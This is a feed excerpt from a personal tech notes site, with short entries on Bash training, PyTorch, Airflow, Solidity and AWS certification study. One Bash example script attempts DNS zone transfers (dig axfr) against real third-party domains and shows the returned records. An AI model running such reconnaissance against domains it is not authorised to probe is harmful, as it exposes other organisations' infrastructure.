It talks about definitions of Smartness and Perceptual Transcends which is basically based on our experience and general knowledge on what we understand our current reality.</description></item><item><title/><link>https://www.darvein.net/coding/00-coding_todos/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/00-coding_todos/</guid><description>Coding TODOS Board TODOs https://pytorch.org/tutorials/ https://www.tensorflow.org/tutorials https://www.tensorflow.org/guide Review blockchain roadmap or smthng https://python-course.eu/python-tutorial/ Book: Document Violent Python Read Django Documentation: https://docs.djangoproject.com/en/5.0/ Read Vuejs Documentation: https://vuejs.org/guide/introduction.html Django Book VueJS Book Automate the Boring Stuff with Python: Practical Programming for Total Beginners Tutorial Howtos: https://docs.python.org/3/howto/index.html Tutorial Library: https://docs.python.org/3/library/index.html Book: Python Crash Course, 2nd Edition: A Hands-On, Project-Based Introduction to Programming Book: Mastering python networking, Eric chau Read python documentation Redo Bash notes Bash: built-in commands, pipes, filters https://exercism.</description></item><item><title/><link>https://www.darvein.net/coding/bash/training/content/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/bash/training/content/</guid><description>Bash Scripting Training Content Day 1 Linux basics Bash introduction Essential tools you need to know List of commands Day 2 Special variables $#, $0, $n, $$, $?, $!, $@/$* Arrays Programming Structures Essential tools you need to know - Part 2 sort, uniq, find, cut, awk, sed tr, xargs, which Day 3 Redirections stdin, stdout, stderr, tee, /dev/null, /dev/fd/0 /dev/stdin, /dev/tcp/host/port Functions Bash export functions Declare -fx foo Pipes Status and Exit codes 0 and 255 syscall responder waitpid Error management and debugging -eux, trap, echos &amp;ndash;debugger (bashdb) Day ?</description></item><item><title/><link>https://www.darvein.net/coding/bash/training/day1/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/bash/training/day1/</guid><description>Bash training - Day 1 Linux basics Quick and simple intro to GNU/Linux.
Directories and files on Linux What type of files exist on Linux?
Symbol Meaning - Regular file d Directory l Link c Special file s Socket p Named pipe b Block device Linux filesystem:
Comparing two directories:
$ diff -q a b Files a/1.txt and b/1.txt differ Only in b: 3.txt Only in b: 4.txt Only in b: 5.</description></item><item><title/><link>https://www.darvein.net/coding/bash/training/day2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/bash/training/day2/</guid><description>Bash training - Day 2 Bash variables and programming structures Variables Basic variables definition:
$ cat 01.sh #!/bin/bash name=&amp;#34;Lobo López&amp;#34; echo &amp;#34;Hello ${name}&amp;#34; echo -e &amp;#34;\e[1;31mbye bye&amp;#34; $ ./01.sh Hello Lobo López bye bye Defaulting parameters:
$ cat 01.sh #!/bin/bash domain=&amp;#34;${1:-industrialmurillo.edu.bo}&amp;#34; echo &amp;#34;Checking ${domain}&amp;#34; dig +short ns $domain \ | xargs -I {} dig +short axfr &amp;#34;${domain}&amp;#34; &amp;#34;@{}&amp;#34; $ ./01.sh aeumsa.edu.bo Checking aeumsa.edu.bo serv1.aeumsa.edu.bo. root.aeumsa.edu.bo. 113411 604800 86400 2419200 604800 serv1.</description></item><item><title/><link>https://www.darvein.net/coding/bash/training/day3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/bash/training/day3/</guid><description>Bash training - Day 3 Redirections stdin, stdout, stderr, tee, /dev/null, /dev/fd/0 /dev/stdin, /dev/tcp/host/port Standard intput/output
$ file /dev/stdin /dev/stdin: symbolic link to /proc/self/fd/0 $ file /dev/stdout /dev/stdout: symbolic link to /proc/self/fd/1 $ file /dev/stderr /dev/stderr: symbolic link to /proc/self/fd/2 Special files being used for pipeping
$ ls -ltra /proc/self/fd/0 lrwx------ 1 ubuntu ubuntu 64 Oct 13 20:54 /proc/self/fd/0 -&amp;gt; /dev/pts/0 $ ls -ltra /dev/pts/0 crw--w---- 1 ubuntu tty 136, 0 Oct 13 20:54 /dev/pts/0 Sending stdin and stdout to a file</description></item><item><title/><link>https://www.darvein.net/coding/blockchain/blockchain-roadmap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/blockchain/blockchain-roadmap/</guid><description>Roadmap blockchain Concepts 1st generation: send/receive only bitcoin 2nd generation: add conditions to accept or deny (contracts) ethereum 3rd generation: scalability and interoperatilibity cardano &amp;amp; polkadot DeFi: protocols: MarkerDAO, Aave, Compound (Ethereum) Cardano, Binance Smart Chain, Cosmos, Avalance, Polkadot Dapps DAOs Frameworks Solidity Algorand waveportal https://github.com/gavinmgrant/waveportal Platforms Ethereum Polygon Cardano Corda Solana EOSIO Quorum Fantom (for smart contracts) Hyperledger Fabric Hyperledger Sawtooth Binance Tools REMIX web3 development https://www.alchemy.com/ get free matic token (polygon) https://faucet.</description></item><item><title/><link>https://www.darvein.net/coding/datascience/airflow/basics/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/datascience/airflow/basics/</guid><description>Airflow basics Introduction Example of the DAG dashboard
DAG Creation A DAG (Directed acyclic graph) is a set of tasks connected between them, it has a start and an end.
Example: Create table -&amp;gt; Is API Available -&amp;gt; Extract data -&amp;gt; Store user -&amp;gt; process user
Skeleton example:
airflow.cfg airflow.db dags/ logs/ unitests.cfg webserver_config.py Sample of a DAG user_processing.py
from airflow.models import DAG from datetime import datetime from airflow.providers.sqlite.operators.sqlite import SqliteOperator default_args = { &amp;#39;start_date&amp;#39;: datetime(2020, 1, 1) } with DAG(&amp;#39;user_processing&amp;#39;, schedule_interval=&amp;#39;@daily&amp;#39;, default_args=default_args, catchup=False) as dag: create_table = SqliteOpreator( task_id=&amp;#39;creating_table&amp;#39;, sqlite_conn_id=&amp;#39;db_sqlite&amp;#39;, sql=&amp;#39;&amp;#39;&amp;#39; CREATE TABLE users ( firstname TEXT NOT NULL, lastname TEXT NOT NULL, country TEXT NOT NULL, username TEXT NOT NULL, password TEXT NOT NULL, email TEXT NOT NULL PRIMARY KEY ); &amp;#39;&amp;#39;&amp;#39; ) Then start the airflow webserver: airflow webserver and also airflow scheduler</description></item><item><title/><link>https://www.darvein.net/coding/datascience/datasience-basis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/datascience/datasience-basis/</guid><description>Datascience basis Intro Data VS Big Data!!! &amp;mdash;&amp;gt; Se trata de las mismas ideas y objetivos aplicadas a 2 situaciones:
cuando el volumen, la velocidad, la variedad, la veracidad/confiabilidad, y el valor del corpus de datos en uso son manejables dentro de los parámetros básicos en cuanto a infraestructura lógica y técnicas de procesamiento cuando el volumen, la velocidad, la variedad, la veracidad/confiabilidad, y el valor del corpus de datos en uso son tales (en un caso o en los cinco) que hacen necesario el despliegue, operaciones y procesamiento en un ecosistema distribuido Steps: En la práctica estos pasos no son lineales e incrementales, sino q pueden ser iterativos o simultáneos &amp;hellip;como puede verse, los pasos 1 y 2 corresponden a lo q normalmente se entiende como Data Engineering, en tanto q los pasos 3 al 6 son más bien lo q corresponde al Data Scientist como tal.</description></item><item><title/><link>https://www.darvein.net/coding/deeplearning/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/deeplearning/</guid><description>Deep learning notes Deep Learning is a subset of Machine Learning and this one is a subset of Artificial Intelligence.
Required Math:
Linear Algebra Calculus Probability and statistics Frameworks: Numpy, Pnadas, Matplotlib, tensorflow, Keras, pytorch, hugging Face
Keys:
Data Preprocessing: data cleaning, normalization ML algos: linear regression, decision trees, random forest, SVM, K-NN Evaluaction metrics: Accuracy, precision, Recall, F1 Score Deeplearning: neural networks. CNNs, RNNs, GANs, Transformers NPL: text mining, sentiment analysis Reinforcement learning: q-learning, policy gradients &amp;#x2015; ML vs DL &amp;#x2015; LLMs: GPT (openai), BERT (google), Roberta (facebook)</description></item><item><title/><link>https://www.darvein.net/coding/python/python-tutorial/python-tutorial/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/python/python-tutorial/python-tutorial/</guid><description>Python Tutorial Resource: https://docs.python.org/3/tutorial/index.html Overview At first glance this teaches about:
Basics: variables, operators and data types. Math, numbers, strings and lists Flow structures: if, for, while loops. break/continue Functions Data structures: lists, dicts, sets, tuples Modules, Packages and Classes Most popular libs: math, random, datetime, statistics, Exceptions: try, except, finally Others: List comprehension, function decorators An Informal Introduction to Python Simplier math operations, variables definition and strings manipulation. Also a little bit of lists.</description></item><item><title/><link>https://www.darvein.net/coding/python/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/python/readme/</guid><description> Python notes index Resource: https://docs.python.org/3/tutorial/index.html</description></item><item><title/><link>https://www.darvein.net/coding/pytorch/pytorch-tutorials/00-basics/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/pytorch/pytorch-tutorials/00-basics/</guid><description>Basics Here my notes on my processes of learning Pytorch from Pytorch official tutorials.
URL: https://pytorch.org/tutorials/beginner/basics/quickstart_tutorial.html Ok, this page says I will become a ninja ML killer developer. &amp;#x1f977;
It will teach the whole ML Workflow development:
Working with data Creating models Optimizing model parameters Saving and deploying trained models We will use FashionMNIST data set becase we like clothes and we are cool &amp;#x1f455;
Pre-reqs We first need to create an isolated python environment, conda can help here:</description></item><item><title/><link>https://www.darvein.net/coding/pytorch/pytorch-tutorials/01-quickstart/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/pytorch/pytorch-tutorials/01-quickstart/</guid><description>Quickstart Setup the model We basically start getting the training and test data from FashionMNIST which is one of the many available vision datasets for pytorch.
(dev) ~z➤ python 01.py Shape of X [N, C, H, W]: torch.Size([64, 1, 28, 28]) Shape of y: torch.Size([64]) torch.int64 Then we create the model. Here we basically we use a lot nn.Module lib, it helps creating the NeuralNetwork and other parameters for itself.</description></item><item><title/><link>https://www.darvein.net/coding/pytorch/pytorch-tutorials/02-tensors/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/pytorch/pytorch-tutorials/02-tensors/</guid><description>Tensors A tensor is a data structure, a multi-dimensional array. Used to store data for input and output to a given model. It can be created by Numpy or like on this case with PyTorch.
Tensor Properties:
Data type Shape Dimension/Rank Size Mutability Tensor operations Over 100 tensor operations, including arithmetic, linear algebra, matrix manipulation (transposing, indexing, slicing), sampling</description></item><item><title/><link>https://www.darvein.net/coding/pytorch/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/pytorch/readme/</guid><description> Pytorch Learning Notes Labs First: Setup your local environment:
virtualenv venv . venv/bin/activate pip install -r requirements.txt Models Train a model:
Pre: Prep your data Setup pytorch env locally Define a simple neural network Load data Define Loss Function and Optimizer Train data in a loop Evaluate the model Save the Model &amp;#x1f4be; Visualize? Deploy?</description></item><item><title/><link>https://www.darvein.net/coding/solidity/solidity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/coding/solidity/solidity/</guid><description>Solidity notes remix: https://remix-ide.readthedocs.io/en/latest/ Coding license headers
pragma version
smart contract
state variables functions function modifiers events struct types / enum types Use cases? gaming and blockchain ethereum transactions over web3 nft voting system! multi-signature accounts? Tips / Best practices small uints in structs saves gas! clustered variables (next to each other) saves gas! view and pure doesn&amp;rsquo;t cost gas if called internally/privately Resources Solidity &amp;amp; Ethereum in React (Next JS): The Complete Guide : https://www.</description></item><item><title/><link>https://www.darvein.net/devops/01_devops_todos/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/01_devops_todos/</guid><description>Devops TODOs Board TODOs AWS Documentation Kubernetes documentation Book: From bash to Z she&amp;rsquo;ll, kiddle peek Kindle: Site Reliability Engineering: How Google Runs Production Systems Kindle: Shell Scripting: How to Automate Command Line Tasks Using Bash Scripting and Shell Programming Some other TODOs Study Terraform Study Prometheus Docker in deep, linux internals Git internals Bash scripting 101 Python scripting for devops Ansible collections vs playbooks Monitoring &amp;amp; Logging: Grafana, ELK, Prometheus, New Relic, Datadog, Splunk, Papertrail Databases and Storage: Redis, Mysql, Elasticsearch, Mongodb, RabbitMq, Kafka Servers: Nginx, Apache Datascience: Spark, Hadoop, Flink, Airflow, Arrow AI Deep Learning: Kubeflow, MLFlow Books to search The phoenix project, gene kim Continuos delivery, jez humble The devops handbook, gene kim Site reliability engineering, betsy beyer Accelerate, Nicole Forsgren Cloud native patterns, cornelia davis Cloud computing, Ray Rafaels Architecting the cloud, michael kavis AWS Certified solutions architect official study guid, joe baron The cloud at your service, johy rosenberg How linux works, brian ward The linux command line, william shotts Linux bible, christopher negus Linux pocket guide, daniel barret Unix and linux system administration handbook, evil nemeth Linux for beginners, jason cannon Linux kernel development, robert love Understanding the linux kernel, daniel bovet Mastering embedded linux programming, chris simmonds Practical guide to linux commands, editors, and shell programming, mark sobell Books to read Unix and Linux administration handbook, nemeth Snyder Rhcsa rhce, ex200 and ex300 BPF performance tools, Gregg The practice of cloud system administration, Limoncelli Continuous delivery, humble Farley IT infrastructure architecture, sjaak Laan Books to read (kindle) Continuous Delivery: Reliable Software Releases through Build, Test, and Deployment Automation (Adobe Reader) (Addison-Wesley Signature Series (Fowler)) Building Microservices: Designing Fine-Grained Systems DevOps and Site Reliability Engineering (SRE) Handbook : Non-Programmer’s Guide ( Second Edition) The Linux Command Line, 2nd Edition: A Complete Introduction Incident Management for Operations The Linux Programming Interface: A Linux and UNIX System Programming Handbook IT Infrastructure Architecture - Infrastructure Building Blocks and Concepts Third Edition The TCP/IP Guide: A Comprehensive, Illustrated Internet Protocols Reference rtfm* Wicked Cool Shell Scripts, 2nd Edition: 101 Scripts for Linux, OS X, and UNIX Systems Linux Command Line and Shell Scripting Bible Mastering Linux Shell Scripting RHCSA/RHCE Red Hat Linux Certification Study Guide (Exams EX200 &amp;amp; EX300), 6th Edition (Certification Press) Command Line Kung Fu: Bash Scripting Tricks, Linux Shell Programming Tips, and Bash One-liners Troubleshooting: A Technician&amp;rsquo;s Guide, Second Edition (Isa Technician Series) Kindle: Terraform: Up &amp;amp; Running: Writing Infrastructure as Code Local PDF files found on my computer ├── AL-MigrationplanofJavaApplicationsfromHanaCloudintoAWS-020318-2059.</description></item><item><title/><link>https://www.darvein.net/devops/aws-notes/basic-aws-roadmap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws-notes/basic-aws-roadmap/</guid><description>AWS Basic and Essential Roadmap Some references:
ec2: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/concepts.html ec2 autoscaling: https://docs.aws.amazon.com/autoscaling/ec2/userguide/what-is-amazon-ec2-auto-scaling.html EC2 AMIs AWS AMIs (features Amazon Linux AMI vs Ubuntu AMIs) How to find AMIs AMI Types How to create AMI? How to purchase and sell an AMI Sharing AMIs Instance Types Type of instances Pricing Models or Purchase options How to connect to an EC2 (windows, linux)? linux: SSH Daemon, SSM windows: RDP Storage (EBS) EBS Volumes What is it?</description></item><item><title/><link>https://www.darvein.net/devops/aws-notes/ec2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws-notes/ec2/</guid><description>EC2 Notes AMIs Amazon Machine Images.
AWS Provides 3 AWS-based images:
AMI, AMI2, AMI2023 The current one is AMI 2023, which comes with better security (python3 upgraded, selinux, openssl3, imdsv2). XFS file system for root / and gp3 volume by default. Read More IMDSV2 provides an enforced authentication to the Instance AWS Metadata Info AWS AMI are images from where you can lunch EC2 Instances.
You can create your own AMIs from running instances with your own pre-configured and installed software You can use existing AMI from AWS Marketplace or you can buy an AMI Keep in mind we can create AMIs that are EBS-backed or InstanceStore-backed.</description></item><item><title/><link>https://www.darvein.net/devops/aws-notes/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws-notes/readme/</guid><description> AWS Notes My notes on AWS Learning
TODOs Continue here: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/virtualization_types.html</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-certifications/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-certifications/</guid><description> AWS Certifications Notes on both AWS Certifications
AWS Solutions Architect Associate &amp;#x1F5D2; AWS API Gateway &amp;#x1F5D2; Assoc exam &amp;#x1F5D2; Cloudfront &amp;#x1F5D2; CloudWatch &amp;#x1F5D2; Security &amp;#x1F5D2; DynamoDB &amp;#x1F5D2; Virtual hard disk. Block based storage. &amp;#x1F5D2; EC2 &amp;#x1F5D2; EFS Elastic filesystem &amp;#x1F5D2; Elastic Encoder &amp;#x1F5D2; Elasticache &amp;#x1F5D2; AWS Exam Prep &amp;#x1F5D2; Generalities &amp;#x1F5D2; Identity Access Management &amp;#x1F5D2; AWS Kinesis &amp;#x1F5D2; Lambda &amp;#x1F5D2; Load Balancer &amp;#x1F5D2; RDS &amp;#x1F5D2; Redshift &amp;#x1F5D2; Route53 &amp;#x1F5D2; Simple Storage Service S3 &amp;#x1F5D2; Segurity groups &amp;#x1F5D2; Snowball &amp;#x1F5D2; SNS Simple notification service &amp;#x1F5D2; SQS &amp;#x1F5D2; AWS Storage Gateway &amp;#x1F5D2; Simple Workflow Service &amp;#x1F5D2; VPC AWS Solutions Architect Professional &amp;#x1F5D2; Associate arch plan and notes &amp;#x1F5D2; Cognito &amp;#x1F5D2; Directory Service &amp;#x1F5D2; AWS Exam Prep &amp;#x1F5D2; IAM &amp;#x1F5D2; RAM &amp;#x1F5D2; S3 &amp;#x1F5D2; Service Quotas &amp;#x1F5D2; VPC &amp;#x1F5D2; VPN &amp;#x1F5D2; Well architected framework &amp;#x1F5D2; Workspaces &amp;#x1F5D2; Written notes</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-jq/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-jq/</guid><description>AWS and JQ Examples # List instances by creation time aws ec2 describe-instances --query &amp;#39;Reservations[*].Instances[*].[InstanceId,LaunchTime]&amp;#39; --region us-west-2 --output text | sort -n -k 2 # List all EC2 Instances aws ec2 describe-instances --region us-east-1 \ | jq -r \ &amp;#39;.Reservations[].Instances[] | [.InstanceId, .PublicIpAddress, (.Tags[]|select(.Key==&amp;#34;Name&amp;#34;).Value)]&amp;#39; aws ec2 describe-instances |\ jq -r \ &amp;#39;.Reservations[].Instances[] | select(.Tags[].Key | contains(&amp;#34;auto&amp;#34;)).PublicIpAddress&amp;#39; aws rds describe-db-instances |\ jq -r \ &amp;#39;.DBInstances[] | select(.Engine==&amp;#34;postgres&amp;#34; and .DBInstanceIdentifier==&amp;#34;acmeorg-eks-apps-production&amp;#34;).DBInstanceStatus&amp;#39; aws ec2 describe-subnets |\ jq -r \ &amp;#39;.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/api-gateway/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/api-gateway/</guid><description> AWS API Gateway Basics Easy service to publish, maintain and monitor and secure APIs at any scale. &amp;ldquo;front door&amp;rdquo; to different backend services that runs on EC2 or Lambda, etc. Low cost and efficient Throttle api gtwy support to prevent attacks Cloudwatch integrations + logs Same-origin-policy support Cross-origin resource sharing support API Caching improves the latency cache is expired on a certain TTL period</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/assoc-exam/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/assoc-exam/</guid><description>Assoc exam ec2 + autoscaling, alb/elb/nlb windows and nfs, fsx (windows) direct gateway, snowball, vpns on-prems s3, glacier cloudfront vpc, nat gateways api gateway, lambda, route53 sqs, sns, swf iam, scp, aws orgs rds, dynamodb, redshift</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/cloudfront/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/cloudfront/</guid><description>Cloudfront It is a content delivery service. Content is replicated across different edge location. An edge location is not a region nor a AZ, it is a location where data is cached.
it caches static content (web distribution), dynamic, streaming (rtmp) data.
it well integrates with s3, ec2, elb, route53.
a origin for the CDN can be a ec2, s3 or a elb.
objs in CDN are cached with a TTL</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/cloudwatch/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/cloudwatch/</guid><description> CloudWatch Basics Standard monitoring = every 5mins. Detailed monitoring = every 1min. Ability to create custom dashboards with different widgets EC2 instances by default have: cpu utilization, disk i/o, net i/o, status machine/host. (No RAM) Ability to create Alarms based on Tresholds via AWS SNS. Ability to create Events as respond to state changes in aws resources Centralized place for log aggregation It is not Cloudtrail</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/concept-security/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/concept-security/</guid><description> Security AWS have Shared responsability model Least privileges aws has lot of certifications (ISO 2007, etc)s Facets
Identiy Authentication Authorization (iam) Trust IdP (aws cognito, facebook, gmail) SSO SAML, Oauth, OpenID Multi-account management for who ones?
large organizations segreation duties, costs, agillity do we need it?
administrative isolations? limited visibility and discovery of workloads limited and strong isolation for recoveries and/or auditing data?</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/dynamodb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/dynamodb/</guid><description>DynamoDB Basics Fast nosql: mobile, web, gaming, ad-tech, IoT, etc.
Low latency to applications.
Expensive for writes, cheaper for reads.
Stored on SSD
Spread across 3 geographicall distinct data centres (AZs)
dynamodb read/write capacity scales on the fly, no downtimes
eventual consisten reads
consistency acorss all copies of data is within a second (best read performance) strongly consisten reads
returns the results that reflects all writes were successful, prior the read Indexes ?</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/ebs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/ebs/</guid><description>Virtual hard disk. Block based storage. Generalities Tied to a single AZ Can be attached to only one EC2 instance at once EBS has to be in the AZ (subnet) than the EC2. Otherwise move the EBS to other AZ by creating a Snapshot. Same for regions. Can be modified/upgraded on the fly Multiple EBS mounted in a EC2 can help to form a RAID 5/10/0 Defaults Termination protection is turned off by default EBS root vol is by default deleted once upon EC2 termination Encryption EBS root volume CAN NOW be encrypted (only via thrid party solutions).</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/ec2/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/ec2/</guid><description>EC2 Basics EC2 instances backed with EBS can easily recovered by restarting into a different hypervisor InstanceStore in the other hand if the instance fails, the machine and data is lost. Supports user data if a script execution is needed after the machine is boot. ** clustered placement group (one AZ) and spread placement group (multiple AZs). Nitro and XEN are the underlying hypervisors for AWS EC2 Options on-demand: hourly paid.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/efs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/efs/</guid><description> EFS Elastic filesystem Can be attached to multiple ec2 instances at once Scales automatically on size of storage Supports NFSv4 Works only within a Region and multiple AZs in the Region Multi-AZ replication Read after write consistency Can be mounted from on-premises (unsecure without tunnels) Or se AWS Datasync in on-prem infra to sync data to EFS Preserves ownership and permissions from OS You pay for what the size you currently use Multiple EFS&amp;rsquo; can be in sync with with AWS DataSync Pricing 3x times more expensive than EBS 20x times more expensive than S3</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/elastic-transcoder/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/elastic-transcoder/</guid><description> Elastic Encoder basics convert media files for different formats (smarhphones, tables, PCs) no need to guess what would be the best option for the client depending on their internet connection pricing pay based on the minutes of the transcode process and the resolution</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/elasticache/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/elasticache/</guid><description> Elasticache engine options memcached and redis best option against slower disk-based databases improved latency intensive I/O works purely on memory Memcached really good for read-heavy scenarios Redis supports multi-az with master and slave instances</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/exam/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/exam/</guid><description> AWS Exam Prep Solutions Architect Associate General knowledge from AWS needed:
Network: VPC Route53 Migrations Direct connect Snowball, edge, snowmobile Data sync Compute: EC2, ECS Queues: SQS, SNF High availability Serverless Caching: CDN Database: RDS Storage: EFS, EBS, S3 Users (users, roles, policies) NoSQL: Dynamodb Athena Redshift Elasticsearch? Tips: Exam keywords: cost, performance Resources cantrill: https://learn.cantrill.io/p/aws-certified-solutions-architect-associate-saa-c02</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/glacier/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/glacier/</guid><description> Generalities An offline and cheaper storage.
Long-term archival service Chepear but slow Backend for AWS Storage Gateway Virtual Tape Library Faster speed retrievals have more higher pricing Max size 40TB Archives/Objs become inmutable when Locked (it takes 24hrs to be locked) Support IAM Policies to make sure objs are not accidentilly deleted</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/iam/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/iam/</guid><description>Identity Access Management Generalities Root account shouldn&amp;rsquo;t be used for shopping. First account when you create an AWS Account AWS Accounts created by a single Root user are isolated and secure Each account handles: Authentication, Authorization and Billing individually Objs: Users Groups Roles Permissions (policies) Security principles: Authentication &amp;amp; Authorization Chain of credentials https://docs.aws.amazon.com/AWSJavaSDK/latest/javadoc/com/amazonaws/auth/DefaultAWSCredentialsProviderChain.html Generalities v2 Root Users/User Groups Groups: Administrators, Devops, Developers, Externals (&amp;ldquo;readonly&amp;rdquo;) Users: regular users for people!</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/kinesis/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/kinesis/</guid><description> AWS Kinesis Service for high support streaming data from different sources (games, amazon purchaces, stock pirces, etc)
Basics 3 kinesis: Streams, Firehose and Analytics producers (ec2, mobiles, computers, IoT devs) consumers (ec2 instances, redshift, elasticsearch) Kinesis Streams data producers -&amp;gt; kinesis streams (stored 24h-7days) in shards -&amp;gt; data consumers -&amp;gt; storage the capacity is measured by the number of shards Kinesis Firehose data producers -&amp;gt; kinesis firehose (not need for data consumers nor shards) -&amp;gt; s3 -&amp;gt; data consumers data is not stored, it gets deleted as soon is proceesed by firehose Kinesis Analytics data procucers -&amp;gt; kinesis analytics -&amp;gt; data consumers (s3, redshift, es) fast sql over the data</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/lambda/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/lambda/</guid><description>Lambda Basics Serverless service. The underlying infrastructure is managed by AWS.
Even-driven compute service (s3, dynamodb) Response of HTTP requests via AWS API Gateway Supports multiple languages engines (node, python, c#, java). An IAM Role is needed A variaty of triggers (alexa skills, cloudfront, cloudwatch, dynamodb, s3, , api gateway, etc). 1 lambda function execution per request. The evolution would be Data Centre -&amp;gt; IaaS -&amp;gt; PaaS -&amp;gt; Containers -&amp;gt; Serverless.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/load-balancer/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/load-balancer/</guid><description>Load Balancer Basics Types: Application, Network, Classic load balancer. X-forward-For header is forwared from outside to the instance server HTTP 504 if the backend app is having issues, not reacheable. LBs costs money :) Application load balancer HTTP/HTTPS (based on methods, routes) operates on layer 7 Network load balancer TCP traffic based layer 4 millions of requests per second, ultra low latencies Classic load balancer Elastic load balancer Mix of layer 7 and 4.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/rds/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/rds/</guid><description>RDS Supports relational: SQL Server, Oracle, Mysql, Aurora, PostgreSQL, MariaDB Supports nosql: dynamodb Data warehousing: redshift (OLAP) Encryption is supported (only applies if the db is being created and encryption option is enabled) All RDS are OLTP Backups two types: automated backups and database snapshots automated backups: aws takes a full daily snapshots with a retention period of 35 days. enabled by default stored in s3 during the backup process, the db i/o may be suspended or increased latency may be seen database snapshots: user initiazed triggered when a db is deleted the restore process creates a new RDS 